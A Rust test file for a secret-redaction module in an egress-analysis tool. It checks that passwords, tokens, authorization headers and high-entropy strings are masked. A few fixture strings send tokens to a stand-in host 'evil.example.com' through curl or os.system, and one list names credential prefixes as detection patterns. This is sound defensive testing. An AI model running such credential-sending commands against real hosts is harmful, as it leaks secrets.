//! Redaction. Every class runs before identity and truncation.

mod common;

use egress_core::destination::{self as d, TemplatePart};
use egress_core::escape::escape;
use egress_core::identity::{blind_spot_key, finalize, site_key};
use egress_core::json::to_json;
use egress_core::model::BlindSpotKind;
use egress_core::redact::{REDACTED, redact};

fn contains(haystack: &[u8], needle: &str) -> bool {
    haystack
        .windows(needle.len())
        .any(|w| w == needle.as_bytes())
}

#[test]
fn userinfo_and_listed_query_key() {
    let dest = d::literal("https://bob:hunter2@api.example.com/x?token=abc&page=2");
    assert_eq!(
        dest.display,
        "https://<redacted>@api.example.com/x?token=<redacted>&page=2"
    );
    assert_eq!(dest.value, dest.display);

    let mut r = common::report(
        vec![common::site(
            "page.py",
            "fetch_page",
            "python:requests.get",
            dest,
            5,
        )],
        vec![],
    );
    finalize(&mut r);
    let key = site_key(&r.sites[0]);
    let json = to_json(&r);
    for secret in ["hunter2", "abc"] {
        assert!(!contains(&key, secret), "identity key holds {secret}");
        assert!(!json.contains(secret), "JSON holds {secret}");
    }
    common::validate(&json).unwrap();
}

#[test]
fn unlisted_key_keeps_value_and_parameter_order_is_kept() {
    assert_eq!(
        redact("https://h.example/x?page=2&TOKEN=abc&a=1&x_token=q"),
        "https://h.example/x?page=2&TOKEN=<redacted>&a=1&x_token=<redacted>"
    );
}

#[test]
fn every_listed_query_key_is_redacted() {
    for key in [
        "token",
        "key",
        "api_key",
        "apikey",
        "secret",
        "password",
        "passwd",
        "pwd",
        "auth",
        "sig",
        "signature",
        "access_token",
        "client_secret",
        "credential",
        "session",
    ] {
        let out = redact(&format!("https://h.example/x?{key}=SECRETVALUE&page=2"));
        assert_eq!(
            out,
            format!("https://h.example/x?{key}=<redacted>&page=2"),
            "key {key}"
        );
    }
}

#[test]
fn token_prefix_under_unlisted_key_is_redacted() {
    for prefix in [
        "ghp_",
        "github_pat_",
        "glpat-",
        "sk-",
        "sk_live_",
        "AKIA",
        "AIza",
        "xoxb-",
        "xoxp-",
        "npm_",
        "pypi-",
        "eyJ",
    ] {
        let secret = format!("{prefix}Zq9.x-_Y");
        let out = redact(&format!("https://h.example/x?id={secret}&page=1"));
        assert_eq!(
            out, "https://h.example/x?id=<redacted>&page=1",
            "prefix {prefix}"
        );
    }
}

#[test]
fn token_run_in_every_text_position() {
    let path = d::literal("https://h.example/x/ghp_abc123");
    assert_eq!(path.display, "https://h.example/x/<redacted>");

    let env = d::env("REPO_TOKEN", Some("ghp_abc123"));
    assert_eq!(env.default.as_deref(), Some(REDACTED));

    let expr = d::expr("client.get(\"ghp_abc123\")");
    assert_eq!(expr.display, "expr:client.get(\"<redacted>\")");

    let construct = d::construct_text("exec(\"T = 'ghp_abc123'\")");
    assert_eq!(construct, "exec(\"T = '<redacted>'\")");

    let mut r = common::report(
        vec![
            common::site("repo.py", "fetch_repo", "python:requests.get", path, 5),
            common::site("repo.py", "<module>", "python:os.environ", env, 1),
            common::site("repo.py", "f", "python:requests.get", expr, 9),
        ],
        vec![common::blind(
            "repo.py",
            "<module>",
            BlindSpotKind::DynamicCode,
            &construct,
            2,
        )],
    );
    finalize(&mut r);
    let json = to_json(&r);
    assert!(!json.contains("ghp_abc123"));
    for s in &r.sites {
        assert!(!contains(&site_key(s), "ghp_abc123"));
    }
    assert!(!contains(&blind_spot_key(&r.blind_spots[0]), "ghp_abc123"));
}

#[test]
fn must_not_redact_prefixes_inside_words() {
    for text in [
        "https://h.example/offers/risk-free",
        "keyJar",
        "https://h.example/keyJar?page=1",
        "expr:mask-off",
        "TASKAKIAX",
    ] {
        assert_eq!(redact(text), text);
    }
}

#[test]
fn template_is_redacted_in_rendered_form() {
    let dest = d::template(&[
        TemplatePart::Literal("https://".into()),
        TemplatePart::Hole(d::env("U", None)),
        TemplatePart::Literal(":hunter2@h".into()),
    ]);
    assert_eq!(dest.display, "https://<redacted>@h");
    assert!(!dest.value.contains("hunter2"));
}

#[test]
fn template_holes_render_and_survive_when_clean() {
    let dest = d::template(&[
        TemplatePart::Hole(d::env("API_BASE", None)),
        TemplatePart::Literal("/v1/items".into()),
    ]);
    assert_eq!(dest.display, "{env:API_BASE}/v1/items");
    let dest = d::template(&[
        TemplatePart::Literal("https://api.example.com/users/".into()),
        TemplatePart::Hole(d::param(1, "get_user")),
    ]);
    assert_eq!(
        dest.display,
        "https://api.example.com/users/{param:1:get_user}"
    );
}

#[test]
fn template_with_host_hole_redacts_listed_query_key() {
    let dest = d::template(&[
        TemplatePart::Hole(d::env("API_BASE", None)),
        TemplatePart::Literal("/x?token=abc&page=2".into()),
    ]);
    assert_eq!(dest.display, "{env:API_BASE}/x?token=<redacted>&page=2");
}

#[test]
fn unparseable_url_fails_closed() {
    assert_eq!(redact("https://u:pw@[bad/x"), "https://<redacted>@[bad/x");
}

#[test]
fn fragment_parameter_is_redacted() {
    assert_eq!(
        redact("https://h.example/cb#access_token=x&state=1"),
        "https://h.example/cb#access_token=<redacted>&state=1"
    );
}

#[test]
fn provider_path_secrets_are_redacted() {
    assert_eq!(
        redact("https://api.telegram.org/bot123456:AAHfakeToken_x-9/sendMessage"),
        "https://api.telegram.org/bot<redacted>/sendMessage"
    );
    assert_eq!(
        redact("https://hooks.slack.com/services/T0/B0/secret"),
        "https://hooks.slack.com/services/<redacted>"
    );
    assert_eq!(
        redact("https://discord.com/api/webhooks/1/tok"),
        "https://discord.com/api/webhooks/1/<redacted>"
    );
    assert_eq!(
        redact("https://discord.com/api/v10/webhooks/42/tok?wait=true"),
        "https://discord.com/api/v10/webhooks/42/<redacted>?wait=true"
    );
}

#[test]
fn keyword_dsn_value_is_redacted() {
    assert_eq!(redact("host=db password=pw"), "host=db password=<redacted>");
    assert_eq!(
        redact("host=db password='a b c' dbname=app"),
        "host=db password=<redacted> dbname=app"
    );
    assert_eq!(redact("host=db user=app"), "host=db user=app");
}

#[test]
fn expr_secret_straddling_truncation_leaks_no_prefix() {
    let filler = "a".repeat(110);
    let source = format!("f({filler}, \"ghp_SECRETSECRETSECRETSECRET\")");
    let dest = d::expr(&source);
    assert!(dest.value.chars().count() <= d::MAX_TEXT_CHARS);
    assert!(!dest.display.contains("ghp"), "{}", dest.display);
    assert!(!dest.display.contains("SECRET"), "{}", dest.display);
}

#[test]
fn expr_is_whitespace_collapsed_and_truncated() {
    let dest = d::expr("{ host: \"api.example.com\",\n    path: \"/health\",\r\n  agent }");
    assert_eq!(
        dest.display,
        "expr:{ host: \"api.example.com\", path: \"/health\", agent }"
    );
    let long = d::expr(&"x".repeat(300));
    assert_eq!(long.value.chars().count(), d::MAX_TEXT_CHARS);
}

#[test]
fn construct_text_is_redacted_then_truncated_then_escaped() {
    let mut source = String::from("run(\u{1b}[31m, ");
    source.push_str("\"https://u:pw@h/x\", ");
    while source.chars().count() < 200 {
        source.push('z');
    }
    let construct = d::construct_text(&source);
    assert!(construct.chars().count() <= d::MAX_TEXT_CHARS);
    assert!(!construct.contains("pw"));
    assert!(construct.contains("https://<redacted>@h/x"));

    let mut r = common::report(
        vec![],
        vec![common::blind(
            "a.py",
            "<module>",
            BlindSpotKind::DynamicCode,
            &construct,
            1,
        )],
    );
    let json = to_json(&r);
    let v: serde_json::Value = serde_json::from_str(&json).unwrap();
    let out = v["blind_spots"][0]["construct"].as_str().unwrap();
    assert!(!out.contains('\u{1b}'));
    assert!(!out.contains("pw"));
    assert_eq!(out, escape(&construct));
    finalize(&mut r);
    assert!(!contains(&blind_spot_key(&r.blind_spots[0]), "pw@"));
}

#[test]
fn must_not_change_a_url_without_credentials() {
    for url in [
        "https://api.example.com/v1/items",
        "https://Example.COM:443/a/../b?x=1&page=2#frag",
        "http://h.example",
        "wss://api.example.com/live",
        "https://h.example/path@segment",
    ] {
        assert_eq!(redact(url), url);
        assert_eq!(d::literal(url).display, url);
    }
}

#[test]
fn non_url_destinations_pass_through() {
    for text in ["api.example.com:443", "db.example.com:5432", "/users"] {
        assert_eq!(redact(text), text);
    }
    assert_eq!(d::exec("curl").display, "exec:curl");
    assert_eq!(d::lib("libc.so.6").display, "lib:libc.so.6");
    assert_eq!(d::env("API_URL", None).display, "env:API_URL");
    assert_eq!(
        d::param(1, "<impl Api>::get").display,
        "param:1:<impl Api>::get"
    );
}

#[test]
fn redaction_is_idempotent() {
    for text in [
        "https://bob:hunter2@api.example.com/x?token=abc&page=2",
        "https://u:pw@[bad/x",
        "host=db password=pw",
        "https://hooks.slack.com/services/T0/B0/secret",
        "ghp_abc123 and sk-live",
    ] {
        let once = redact(text);
        assert_eq!(redact(&once), once, "{text}");
    }
}

#[test]
fn keyword_after_call_punctuation_is_redacted() {
    assert_eq!(
        redact("psycopg2.connect(password=\"PYPW1\", host=h)"),
        "psycopg2.connect(password=<redacted>, host=h)"
    );
    assert_eq!(
        redact("psycopg2.connect(host=h,password=\"HUNTER3PW\")"),
        "psycopg2.connect(host=h,password=<redacted>)"
    );
    assert_eq!(
        redact("Server=db;Password=pw;Database=app"),
        "Server=db;Password=<redacted>;Database=app"
    );
    assert_eq!(redact("f({password='a b'})"), "f({password=<redacted>})");
}

#[test]
fn bracketed_keyword_value_is_redacted_whole() {
    assert_eq!(
        redact("requests.post(**kw, auth=(\"admin\", \"HUNTER2PW\"))"),
        "requests.post(**kw, auth=<redacted>)"
    );
    assert_eq!(
        redact("f(auth=[get(\"u\"), \"PW)\"], page=2)"),
        "f(auth=<redacted>, page=2)"
    );
    // An unterminated bracket runs to the end of the text (fail closed).
    assert_eq!(redact("f(auth=(\"admin\", \"PW"), "f(auth=<redacted>");
}

#[test]
fn colon_keyed_entry_is_redacted() {
    assert_eq!(
        redact("urllib.request.Request(u, headers={\"X-Api-Key\": \"HUNTER6PW\"})"),
        "urllib.request.Request(u, headers={\"X-Api-Key\": <redacted>})"
    );
    assert_eq!(
        redact("https.request({ hostname: h, headers: { Authorization: \"Bearer JSPW2\" } })"),
        "https.request({ hostname: h, headers: { Authorization: <redacted> } })"
    );
    assert_eq!(
        redact("f({'api-key': 'K1', 'x-apikey': `K2`})"),
        "f({'api-key': <redacted>, 'x-apikey': <redacted>})"
    );
    assert_eq!(
        redact("f({ secret: s, page: 2 })"),
        "f({ secret: <redacted>, page: 2 })"
    );
}

#[test]
fn authorization_scheme_token_is_redacted() {
    assert_eq!(
        redact("exec([\"curl\", \"-H\", \"Bearer abc.DEF-1\"])"),
        "exec([\"curl\", \"-H\", \"Bearer <redacted>\"])"
    );
    assert_eq!(
        redact("h.set(\"Basic dXNlcjpwYXNz\")"),
        "h.set(\"Basic <redacted>\")"
    );
    assert_eq!(
        redact("fetch(u, {headers: {Authorization: `bearer ${t}`}})"),
        "fetch(u, {headers: {Authorization: <redacted>}})"
    );
    assert_eq!(
        redact("h.set(\"BEARER abc.DEF-1\")"),
        "h.set(\"BEARER <redacted>\")"
    );
    assert_eq!(
        redact("h.set(\"basic dXNlcjpwYXNz\")"),
        "h.set(\"basic <redacted>\")"
    );
}

#[test]
fn must_not_redact_unlisted_keys_or_non_assignments() {
    for text in [
        "psycopg2.connect(host=h, page=2, dbname=\"app\")",
        "https.request({ hostname: h, path: \"/x\", port: 443 })",
        "{\"host\": \"api.example.com\", \"page\": 2}",
        "f(token == x)",
        "f(a, token==x)",
        "items.map((token) => fetch(u))",
        "items.map(token => fetch(u))",
        "reqwest::Client::new(auth::url())",
        "f(Bearer {env:TOKEN})",
        "\"Bearer \" + t",
        "api.example.com:443",
        "auth.example.com:443",
        "https://h.example/x?page=2#frag",
    ] {
        assert_eq!(redact(text), text, "{text}");
    }
}

#[test]
fn expr_secrets_never_reach_output_or_identity() {
    let sources = [
        "psycopg2.connect(password=\"PYPW1\", host=h)",
        "psycopg2.connect(host=h,password=\"HUNTER3PW\")",
        "requests.post(**kw, auth=(\"admin\", \"HUNTER2PW\"))",
        "urllib.request.Request(u, headers={\"X-Api-Key\": \"HUNTER6PW\"})",
        "https.request({ hostname: h, headers: { Authorization: \"Bearer JSPW2\" } })",
    ];
    let secrets = ["PYPW1", "HUNTER3PW", "HUNTER2PW", "HUNTER6PW", "JSPW2"];
    let sites = sources
        .iter()
        .enumerate()
        .map(|(i, s)| common::site("a.py", "f", "python:requests.get", d::expr(s), i as u32 + 1))
        .collect();
    let mut r = common::report(sites, vec![]);
    finalize(&mut r);
    let json = to_json(&r);
    for secret in secrets {
        assert!(!json.contains(secret), "JSON holds {secret}");
        for s in &r.sites {
            assert!(
                !contains(&site_key(s), secret),
                "identity key holds {secret}"
            );
        }
    }
    common::validate(&json).unwrap();
}

#[test]
fn call_text_redaction_is_idempotent() {
    for text in [
        "psycopg2.connect(password=\"PYPW1\", host=h)",
        "requests.post(**kw, auth=(\"admin\", \"HUNTER2PW\"))",
        "f({\"X-Api-Key\": \"K\", Authorization: \"Bearer T\"})",
        "exec([\"curl\", \"-H\", \"Bearer abc\"])",
    ] {
        let once = redact(text);
        assert_eq!(redact(&once), once, "{text}");
    }
}

#[test]
fn keyed_value_runs_to_the_end_of_its_entry() {
    for (text, want) in [
        (
            "psycopg2.connect(host=h, password=\"a\" + \"LEAK1\")",
            "psycopg2.connect(host=h, password=<redacted>)",
        ),
        (
            "psycopg2.connect(host=h, password=os.getenv(\"X\", \"LEAK2\"))",
            "psycopg2.connect(host=h, password=<redacted>)",
        ),
        (
            "https.request({ hostname: h, auth: x || \"admin:LEAK3\" })",
            "https.request({ hostname: h, auth: <redacted> })",
        ),
        (
            "https.request({ hostname: h, headers: { Authorization: x + Buffer.from('admin:LEAK4').toString('base64') } })",
            "https.request({ hostname: h, headers: { Authorization: <redacted> } })",
        ),
        (
            "connect(password=b\"LEAK 5\", host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "connect(password=r\"LEAK 6\", host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "connect(password=f\"x LEAK7\", host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "connect(password=rb'LEAK 8', host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "connect(password=\"\"\"correct LEAK9\"\"\", host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "connect(password='''a ' LEAK10''', host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "requests.get(u, auth=HTTPBasicAuth(\"admin\", \"LEAK11\"))",
            "requests.get(u, auth=<redacted>)",
        ),
        (
            "connect(password=\"a\" \"LEAK12\", host=h)",
            "connect(password=<redacted>, host=h)",
        ),
        (
            "f({ \"X-Api-Key\": k ?? \"LEAK13\" })",
            "f({ \"X-Api-Key\": <redacted> })",
        ),
        (
            "connect(password=\"<redacted>\" + \"LEAK14\")",
            "connect(password=<redacted>)",
        ),
        (
            "connect(password=<redacted> + \"LEAK15\")",
            "connect(password=<redacted>)",
        ),
    ] {
        let out = redact(text);
        assert_eq!(out, want, "{text}");
        assert!(!out.contains("LEAK"), "{text}");
        assert_eq!(redact(&out), out, "idempotent: {text}");
    }
}

#[test]
fn keyed_value_stops_before_the_next_argument() {
    for (text, want) in [
        (
            "psycopg2.connect(password=pw,host=\"evil.example.com\")",
            "psycopg2.connect(password=<redacted>,host=\"evil.example.com\")",
        ),
        (
            "psycopg2.connect(password=pw, host=\"evil.example.com\")",
            "psycopg2.connect(password=<redacted>, host=\"evil.example.com\")",
        ),
        (
            "host=db password=x port=5",
            "host=db password=<redacted> port=5",
        ),
        (
            "host=db password='a b' dbname=app",
            "host=db password=<redacted> dbname=app",
        ),
        (
            "Server=db;Password=pw;Database=app",
            "Server=db;Password=<redacted>;Database=app",
        ),
        (
            "password=x\nhost=evil.example.com",
            "password=<redacted>\nhost=evil.example.com",
        ),
        (
            "subprocess.run([\"curl\", \"-H\", \"Authorization: token LEAKB\", \"https://evil.example.com\"])",
            "subprocess.run([\"curl\", \"-H\", \"Authorization: <redacted>\", \"https://evil.example.com\"])",
        ),
        (
            "fetch(mk(u, \"Authorization: Bot LEAKF\"))",
            "fetch(mk(u, \"Authorization: <redacted>\"))",
        ),
        (
            "os.system(u + \" -H 'Authorization: token LEAKC'\")",
            "os.system(u + \" -H 'Authorization: <redacted>'\")",
        ),
    ] {
        let out = redact(text);
        assert_eq!(out, want, "{text}");
        assert_eq!(redact(&out), out, "idempotent: {text}");
    }
    // An unbalanced value runs to the end of the text (fail closed).
    assert_eq!(
        redact("f(password=g(\"LEAK\", h=1"),
        "f(password=<redacted>"
    );
    assert_eq!(redact("f(password=\"LEAK, h=1"), "f(password=<redacted>");
}

#[test]
fn authorization_header_with_any_scheme_is_redacted() {
    for (text, want) in [
        (
            "\"Authorization: Token LEAKA\"",
            "\"Authorization: <redacted>\"",
        ),
        (
            "\"authorization: token LEAKA\"",
            "\"authorization: <redacted>\"",
        ),
        (
            "\"Authorization: Bot LEAKA\"",
            "\"Authorization: <redacted>\"",
        ),
        (
            "\"Authorization: Digest LEAKA\"",
            "\"Authorization: <redacted>\"",
        ),
        (
            "{\"Authorization\": \"Token LEAKA\"}",
            "{\"Authorization\": <redacted>}",
        ),
        // No keyed boundary before the header name: only the data rule sees it.
        (
            "curl -HAuthorization: Token LEAKA",
            "curl -HAuthorization: Token <redacted>",
        ),
        (
            "curl -HAuthorization=token LEAKA",
            "curl -HAuthorization=token <redacted>",
        ),
        (
            "curl -HAuthorization: Bot LEAKA",
            "curl -HAuthorization: Bot <redacted>",
        ),
    ] {
        let out = redact(text);
        assert_eq!(out, want, "{text}");
        assert!(!out.contains("LEAKA"), "{text}");
        assert_eq!(redact(&out), out, "idempotent: {text}");
    }
    // A template hole stays readable.
    for text in [
        "curl -HAuthorization: Token {env:T}",
        "curl -HAuthorization: {env:T}",
        "curl -HAuthorization: Token <redacted>",
    ] {
        assert_eq!(redact(text), text, "{text}");
    }
}

#[test]
fn must_not_redact_non_secret_keys_after_rewrite() {
    for text in [
        "{\"host\": \"api.example.com\", \"page\": 2, \"url\": u}",
        "f(host=\"evil.example.com\", page=2, url=u)",
        "f(token == \"x\" + y)",
        "items.map((token) => fetch(u, \"x\"))",
        "auth::url(\"x\", y)",
    ] {
        assert_eq!(redact(text), text, "{text}");
    }
}

#[test]
fn unterminated_keyed_brackets_redact_in_linear_time() {
    let time = |n: usize| {
        let text = "password=(".repeat(n);
        let start = std::time::Instant::now();
        let out = redact(&text);
        let elapsed = start.elapsed();
        assert_eq!(out, "password=<redacted>");
        elapsed
    };
    let small = time(50_000);
    let large = time(200_000);
    // Quadratic work would be 16 times slower for 4 times the input; allow
    // generous slack for timer noise on a linear pass.
    assert!(
        large.as_secs_f64() < small.as_secs_f64() * 10.0 + 0.5,
        "small {small:?} large {large:?}"
    );
    assert!(large.as_secs() < 20, "large {large:?}");
}

#[test]
fn quoted_key_then_comma_pair_value_is_redacted() {
    for (text, want) in [
        (
            "urlopen(Request(u, headers=dict([(\"X-Api-Key\", \"LEAKP1\")])))",
            "urlopen(Request(u, headers=dict([(\"X-Api-Key\", <redacted>)])))",
        ),
        (
            "requests.get(u, headers=[(\"Authorization\", \"Token LEAKP2\"), (\"host\", \"h\")])",
            "requests.get(u, headers=[(\"Authorization\", <redacted>), (\"host\", \"h\")])",
        ),
        (
            "fetch(u, { headers: [[\"Authorization\", \"Token LEAKP3\"], [\"page\", 2]] })",
            "fetch(u, { headers: [[\"Authorization\", <redacted>], [\"page\", 2]] })",
        ),
        (
            "h.set(\"Authorization\", \"Token \" + t + \"LEAKP4\")",
            "h.set(\"Authorization\", <redacted>)",
        ),
        (
            "headers.append('x-api-key', 'LEAKP5'); fetch(u)",
            "headers.append('x-api-key', <redacted>); fetch(u)",
        ),
        (
            "h.set(`authorization`, `Bot LEAKP6`)",
            "h.set(`authorization`, <redacted>)",
        ),
        (
            "[\"curl\", \"-H\", \"token\", \"LEAKP7\", \"https://evil.example.com\"]",
            "[\"curl\", \"-H\", \"token\", <redacted>, \"https://evil.example.com\"]",
        ),
    ] {
        let out = redact(text);
        assert_eq!(out, want, "{text}");
        assert!(!out.contains("LEAK"), "{text}");
        assert_eq!(redact(&out), out, "idempotent: {text}");
    }
    // An unbalanced pair value runs to the end of the text (fail closed).
    assert_eq!(
        redact("h.set(\"Authorization\", f(\"LEAK\""),
        "h.set(\"Authorization\", <redacted>"
    );
}

#[test]
fn must_not_redact_unlisted_or_comma_free_quoted_keys() {
    for text in [
        "requests.get(u, headers=[(\"host\", \"h\"), (\"page\", 2)])",
        "h.set(\"Content-Type\", \"application/json\")",
        "f(\"token\")",
        "f(\"token\" + x)",
        "{\"token\": <redacted>}",
        "f(\"token\",)",
        "f(\"a token\", \"x\")",
        "f(x\"token\", \"y\")",
    ] {
        assert_eq!(redact(text), text, "{text}");
    }
}

#[test]
fn quoted_key_pairs_redact_in_linear_time() {
    let time = |n: usize| {
        let text = "(\"token\", (".repeat(n);
        let start = std::time::Instant::now();
        let out = redact(&text);
        let elapsed = start.elapsed();
        assert!(out == "(\"token\", <redacted>", "not fully redacted");
        elapsed
    };
    let small = time(25_000);
    let large = time(100_000);
    assert!(
        large.as_secs_f64() < small.as_secs_f64() * 10.0 + 0.5,
        "small {small:?} large {large:?}"
    );
    assert!(large.as_secs() < 20, "large {large:?}");
}

// ---- entropy pass (KTD13, R17, AE9) ----------------------------------------

#[test]
fn entropy_redaction_positions() {
    // AE9: an unlisted query key holding a 32-char mixed run is redacted.
    assert_eq!(
        redact("https://api.example.com/x?u=aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d"),
        "https://api.example.com/x?u=<redacted>"
    );
    // A listed query key is already redacted by the param pass.
    assert_eq!(
        redact("https://api.example.com/x?token=aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d"),
        "https://api.example.com/x?token=<redacted>"
    );
    // URL path segments.
    assert_eq!(
        redact("https://api.example.com/aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d/v2"),
        "https://api.example.com/<redacted>/v2"
    );
    // A keyword DSN value under an unlisted key.
    assert_eq!(
        redact("host=db.example.com other=aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d"),
        "host=db.example.com other=<redacted>"
    );
    // Construct and expr text: a string-literal body.
    assert_eq!(
        redact("eval(\"x aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d\")"),
        "eval(\"x <redacted>\")"
    );
    // An env default.
    assert_eq!(redact("aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d"), "<redacted>");
}

#[test]
fn entropy_never_touches_host_scheme_or_ordinary_values() {
    // AE9: a 40-char hex commit hash in a path segment is kept.
    assert_eq!(
        redact("https://api.example.com/a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8/v2"),
        "https://api.example.com/a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8/v2"
    );
    // A hostname made of a long high-entropy label is kept.
    assert_eq!(
        redact("https://aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d.example.com/x"),
        "https://aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d.example.com/x"
    );
    // A 19-char run is kept; a 20-char run is redacted.
    assert_eq!(redact("aB3xK9mZ2vN8pQ4wE7r"), "aB3xK9mZ2vN8pQ4wE7r");
    assert_eq!(redact("aB3xK9mZ2vN8pQ4wE7rT"), "<redacted>");
    // A lowercase-only 32-char run is kept (one class).
    assert_eq!(
        redact("abcdefghijklmnopqrstuvwxyzabcdef"),
        "abcdefghijklmnopqrstuvwxyzabcdef"
    );
    // A digit-only run is kept.
    assert_eq!(
        redact("12345678901234567890123456"),
        "12345678901234567890123456"
    );
    // A UUID and a fixed sample of v4 UUIDs are kept (each piece is short).
    assert_eq!(
        redact("e58ed763-928e-4139-9444-e5f8f90b7d6a"),
        "e58ed763-928e-4139-9444-e5f8f90b7d6a"
    );
    let mut x = 0x9e3779b97f4a7c15u64;
    for _ in 0..1000 {
        // A seeded v4-shaped UUID; every piece stays under 20.
        let mut b = [0u8; 16];
        for v in &mut b {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            *v = x as u8;
        }
        b[6] = b[6] & 0x0f | 0x40;
        b[8] = b[8] & 0x3f | 0x80;
        let u = format!(
            "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
            b[0],
            b[1],
            b[2],
            b[3],
            b[4],
            b[5],
            b[6],
            b[7],
            b[8],
            b[9],
            b[10],
            b[11],
            b[12],
            b[13],
            b[14],
            b[15]
        );
        assert_eq!(redact(&u), u, "{u}");
    }
    // Kebab and snake_case path segments with version digits are kept.
    assert_eq!(
        redact("https://api.example.com/service-v2-prod/report-2025-q4"),
        "https://api.example.com/service-v2-prod/report-2025-q4"
    );
    // A CDN asset path with a short mixed-case hash is kept.
    assert_eq!(
        redact("https://cdn.example.com/a1B2x.png"),
        "https://cdn.example.com/a1B2x.png"
    );
}

#[test]
fn entropy_run_boundaries_split_on_punctuation() {
    // A base64url secret with one `-`: each piece at least min_run that
    // clears the thresholds is redacted.
    let out = redact("aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d-cD4eF6gH8iJ9kL0mN1oP2qR3sT4uV");
    assert_eq!(out, "<redacted>-<redacted>");
    // A JWT-shaped value in a query: each dot-separated segment judged.
    // The eyJ prefix already claims the whole token when present.
    let out = redact(
        "https://api.example.com/x?u=hEaDeR.aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d.cD4eF6gH8iJ9kL0mN1oP2qR3sT4uV5",
    );
    assert_eq!(
        out,
        "https://api.example.com/x?u=hEaDeR.<redacted>.<redacted>"
    );
}

#[test]
fn entropy_idempotent_and_linear() {
    let text = "u=aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d&p=ok https://h.io/aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d";
    let once = redact(text);
    assert_eq!(once, redact(&once));
    // 1 MiB of adversarial runs completes in linear time.
    let big = "aB3xK9mZ2vN8pQ4wE7rT6yU5zA1c2d-".repeat(40_000);
    let start = std::time::Instant::now();
    let _ = redact(&big);
    assert!(start.elapsed().as_secs() < 20, "{:?}", start.elapsed());
}
